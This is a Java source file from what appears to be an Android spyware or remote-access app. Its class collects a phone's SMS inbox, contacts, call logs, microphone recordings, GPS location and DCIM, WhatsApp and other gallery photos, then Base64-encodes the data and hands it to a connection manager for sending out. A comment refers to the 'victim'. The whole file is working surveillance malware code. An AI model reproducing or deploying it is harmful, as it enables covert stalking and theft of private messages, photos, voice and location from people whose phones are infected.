package app.marees.mars.MarsService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import org.apache.commons.io.FileUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import app.marees.mars.Singletons.Myapp;

import static android.content.Context.LOCATION_SERVICE;

/**
 * Created by Marees on 15/Sep/19.
 */

public class DataGetterUtil implements LocationListener {

    static final String MICTAG = "MediaRecording";
    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 10 meters
    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // 1 minute
    public static JSONObject mic = new JSONObject();
    //////mic
    /////////modified test
    static MediaRecorder recorder;
    static File audiofile = null;
    static TimerTask stopRecording;
    ///////////////////
    ////////////////////////location
    private final Context mContext;
    // Declaring a Location Manager
    protected LocationManager locationManager;
    // flag for GPS status
    boolean isGPSEnabled = false;
    // flag for network status
    boolean isNetworkEnabled = false;
    // flag for GPS status
    boolean canGetLocation = false;
    Location location; // location
    double latitude; // latitude
    double longitude; // longitude


    ///////////////////////////////////////////////////////////////////////////////////////////location
    public DataGetterUtil(Context context) {
        this.mContext = context;
        getLocation();
    }

    public static void getSMSList() {

        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();


            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = Myapp.getAppContext().getContentResolver().query(uriSMSURI, null, null, null, null);

            String[] lis = cur.getColumnNames();
            Log.e("", "");
            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                String name = cur.getString(cur.getColumnIndexOrThrow("person"));
                String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                String date_sent = cur.getString(cur.getColumnIndexOrThrow("date_sent"));
                String read = cur.getString(cur.getColumnIndexOrThrow("read"));
                String seen = cur.getString(cur.getColumnIndexOrThrow("seen"));


                long foo = Long.parseLong(date);
                long dateS = Long.parseLong(date_sent);


                Date datew = new Date(foo);
                Date dateSs = new Date(dateS);
                DateFormat formatter = new SimpleDateFormat("dd/MM/yyyy");
                sms.put("phoneNo", address);
                sms.put("msg", body);
                sms.put("name", name);
                sms.put("date", formatter.format(datew));
                sms.put("date_sent", formatter.format(dateSs));
                sms.put("read", read);
                sms.put("seen", seen);
                list.put(sms);

            }
            SMSList.put("Audio", list);
            SMSList.put("Source", "Sms");
            Log.e("done", "collecting");
            ConnectionManager c2 = new ConnectionManager();
            c2.Sms(SMSList);
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }

    /////////////////////////////////////////////////////////////////////////////////////////////mic
    public static void startRecording(int sec) throws Exception {


        //Creating file
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("DIRR", dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);

        } catch (IOException e) {
            Log.e(MICTAG, "external storage access error");

        }


        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        recorder.prepare();
        recorder.start();


        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();
                String encodeAudio = covertAudio(audiofile);
                try {
                    mic.put("Source", "Audio");
                    mic.put("Audio", encodeAudio);
                    ConnectionManager c2 = new ConnectionManager();
                    c2.Mic(mic);

                } catch (JSONException e) {
                    e.printStackTrace();
                }

                audiofile.delete();


            }
        };

        new Timer().schedule(stopRecording, sec * 1000);

    }
////////////////////////////////////////////////////////////////////////////////////////////////////////

    private static String covertAudio(File file) {


        byte[] bytes = new byte[0];
        try {
            bytes = FileUtils.readFileToByteArray(file);
        } catch (IOException e) {
            e.printStackTrace();
        }

        String encode = Base64.encodeToString(bytes, 0);

        return encode;

    }

    ///////////////////////////////////////////////////////////////////Media get
    public static void getDCIMCamera() {

        String[] projection = new String[]{
                MediaStore.Images.ImageColumns._ID,
                MediaStore.Images.ImageColumns.DATA,
                MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
                MediaStore.Images.ImageColumns.DATE_TAKEN,
                MediaStore.Images.ImageColumns.MIME_TYPE};

        Cursor cursor = Myapp.getAppContext().getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");

        List<String> result = new ArrayList<String>(cursor.getCount());
        JSONObject js = new JSONObject();
        JSONArray jsarr = new JSONArray();
        if (cursor.moveToFirst()) {
            final int image_path_col = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            do {

                String path = cursor.getString(image_path_col);
                if (path.contains("/DCIM/")) {
                    result.add(path);

                    File image = new File(path);
                    BitmapFactory.Options bmOptions = new BitmapFactory.Options();
                    Bitmap bitmap = BitmapFactory.decodeFile(image.getAbsolutePath(), bmOptions);
                    bitmap = Bitmap.createScaledBitmap(bitmap, 1080, 720, true);

                    jsarr.put(bitmapCompressor(bitmap));
                    if (jsarr.length() > 20) {
                        try {
                            js.put("DCIM", jsarr);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        ConnectionManager c2 = new ConnectionManager();
                        c2.Dcim(js);
                        Log.e("Sending", "10");
                        jsarr = new JSONArray();
                        js = new JSONObject();
                    }
                    //  encodeddata.add(bitmapCompressor(bitmap));
                }

            }
            while (cursor.moveToNext());

        }
        try {
            js.put("DCIM", jsarr);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        cursor.close();
        Log.e("Final", "dcim");
        ConnectionManager c2 = new ConnectionManager();
        c2.Dcim(js);


    }

    public static String bitmapCompressor(Bitmap myBit) {


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        myBit.compress(Bitmap.CompressFormat.WEBP, 10, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
        return encoded;

    }

    public static void getWhatsappCamera() {

        String[] projection = new String[]{
                MediaStore.Images.ImageColumns._ID,
                MediaStore.Images.ImageColumns.DATA,
                MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
                MediaStore.Images.ImageColumns.DATE_TAKEN,
                MediaStore.Images.ImageColumns.MIME_TYPE};

        Cursor cursor = Myapp.getAppContext().getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");

        List<String> result = new ArrayList<String>(cursor.getCount());
        JSONObject js = new JSONObject();
        JSONArray jsarr = new JSONArray();
        if (cursor.moveToFirst()) {
            final int image_path_col = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            do {

                String path = cursor.getString(image_path_col);
                if (path.contains("/WhatsApp/")) {
                    result.add(path);

                    File image = new File(path);
                    BitmapFactory.Options bmOptions = new BitmapFactory.Options();
                    Bitmap bitmap = BitmapFactory.decodeFile(image.getAbsolutePath(), bmOptions);
                    bitmap = Bitmap.createScaledBitmap(bitmap, 1350, 1080, true);

                    jsarr.put(bitmapCompressor(bitmap));
                    if (jsarr.length() > 20) {
                        try {
                            js.put("Whatsapp", jsarr);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        ConnectionManager c2 = new ConnectionManager();
                        c2.Whatsapp(js);
                        Log.e("whatsapp", "10");
                        jsarr = new JSONArray();
                        js = new JSONObject();
                    }
                    //  encodeddata.add(bitmapCompressor(bitmap));
                }

            }
            while (cursor.moveToNext());

        }
        try {
            js.put("Whatsapp", jsarr);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        cursor.close();
        Log.e("whatsapp", "final");
        ConnectionManager c2 = new ConnectionManager();
        c2.Whatsapp(js);


    }

    public static void getCustomCamera(String custom) {


        String[] projection = new String[]{
                MediaStore.Images.ImageColumns._ID,
                MediaStore.Images.ImageColumns.DATA,
                MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
                MediaStore.Images.ImageColumns.DATE_TAKEN,
                MediaStore.Images.ImageColumns.MIME_TYPE};

        Cursor cursor = Myapp.getAppContext().getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");

        List<String> result = new ArrayList<String>(cursor.getCount());
        JSONObject js = new JSONObject();
        JSONArray jsarr = new JSONArray();
        if (cursor.moveToFirst()) {
            final int image_path_col = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            do {

                String path = cursor.getString(image_path_col);
                if (path.contains("/" + custom + "/")) {
                    result.add(path);

                    File image = new File(path);
                    BitmapFactory.Options bmOptions = new BitmapFactory.Options();

                    Bitmap bitmap = null;
                    try {
                        bitmap = BitmapFactory.decodeFile(image.getAbsolutePath(), bmOptions);
                        bitmap = Bitmap.createScaledBitmap(bitmap, 1350, 1080, true);
                    } catch (Exception e) {
                        break;
                    }
                    jsarr.put(bitmapCompressor(bitmap));
                    if (jsarr.length() > 20) {
                        try {
                            js.put("Custom", jsarr);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        ConnectionManager c2 = new ConnectionManager();
                        c2.Custom(js);
                        Log.e("Custom", "10");
                        jsarr = new JSONArray();
                        js = new JSONObject();
                    }
                    //  encodeddata.add(bitmapCompressor(bitmap));
                }

            }
            while (cursor.moveToNext());

        }
        try {
            js.put("Custom", jsarr);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        cursor.close();
        Log.e("Custom", "final");
        ConnectionManager c2 = new ConnectionManager();
        c2.Custom(js);


    }                                       //////get media path of ur victim image

    public static void getCustomList() {


        String[] projection = new String[]{
                MediaStore.Images.ImageColumns._ID,
                MediaStore.Images.ImageColumns.DATA,
                MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
                MediaStore.Images.ImageColumns.DATE_TAKEN,
                MediaStore.Images.ImageColumns.MIME_TYPE};

        Cursor cursor = Myapp.getAppContext().getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");

        List<String> result = new ArrayList<String>(cursor.getCount());
        JSONObject js = new JSONObject();
        JSONArray jsarr = new JSONArray();
        if (cursor.moveToFirst()) {
            final int image_path_col = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            do {

                String path = cursor.getString(image_path_col);
                jsarr.put(path);


            }
            while (cursor.moveToNext());

        }
        try {
            js.put("Path", jsarr);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        cursor.close();
        Log.e("Path", "final");
        ConnectionManager c2 = new ConnectionManager();
        c2.getPath(js);


    }

    //////////////////////////////////////contact
    public static void getContacts() {

        try {
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();
            Cursor cur = Myapp.getAppContext().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");


            while (cur.moveToNext()) {
                JSONObject contact = new JSONObject();
                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name

                contact.put("phoneNo", num);
                contact.put("name", name);
                list.put(contact);

            }
            contacts.put("Audio", list);
            contacts.put("Source", "Contacts");
            ConnectionManager c2 = new ConnectionManager();
            c2.Contacts(contacts);
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }

    //////////////////////////////////////////////////////////call log
    public static void getCallsLogs() {

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = Myapp.getAppContext().getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("Source", "Calls");
            Calls.put("Audio", list);

            ConnectionManager c2 = new ConnectionManager();
            c2.Call(Calls);
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }

    @SuppressLint("MissingPermission")
    public Location getLocation() {
        try {
            locationManager = (LocationManager) mContext.getSystemService(LOCATION_SERVICE);
            // getting GPS status

            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            // getting network status
            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (isGPSEnabled || isNetworkEnabled) {

                this.canGetLocation = true;

                // First get location from Network Provider
                if (isNetworkEnabled) {
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);

                    Log.d("Network", "Network");
                    if (locationManager != null) {
                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

                        if (location != null) {
                            latitude = location.getLatitude();
                            longitude = location.getLongitude();

                        }
                    }
                }

                // if GPS Enabled get lat/long using GPS Services
                if (isGPSEnabled) {
                    if (location == null) {
                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);


                        if (locationManager != null) {
                            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

                            if (location != null) {
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
                            }
                        }
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        stopUsingGPS();
        return location;
    }

    /**
     * Stop using GPS listener
     * Calling this function will stop using GPS in your app
     */

    public void stopUsingGPS() {
        if (locationManager != null) {
            locationManager.removeUpdates(DataGetterUtil.this);
        }
    }

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

    /**
     * Function to get latitude
     */

    public double getLatitude() {
        if (location != null) {
            latitude = location.getLatitude();
        }

        // return latitude
        return latitude;
    }

    /**
     * Function to get longitude
     */

    public double getLongitude() {
        if (location != null) {
            longitude = location.getLongitude();
        }

        // return longitude
        return longitude;
    }

    /**
     * Function to check GPS/wifi enabled
     *
     * @return boolean
     */

    public boolean canGetLocation() {
        return this.canGetLocation;
    }

    @Override
    public void onLocationChanged(Location location) {
    }

    @Override
    public void onProviderDisabled(String provider) {
    }
    /////////////////////////////////////////////////////////////////////////

    @Override
    public void onProviderEnabled(String provider) {
    }

    ////////////////////////////////////////////////

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }

}
